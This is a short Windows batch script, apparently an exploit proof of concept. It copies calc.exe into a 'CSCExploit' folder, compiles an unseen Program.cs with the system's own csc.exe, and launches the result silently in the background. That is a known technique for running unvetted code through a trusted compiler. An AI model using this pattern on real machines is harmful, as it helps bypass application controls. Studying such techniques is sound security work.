@echo off

copy /Y "C:\Windows\System32\calc.exe" "C:\Temp\CSCExploit\calc.exe" >nul
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /nologo /target:exe "Program.cs"
start "" /B "C:\Temp\CSCExploit\Program.exe"
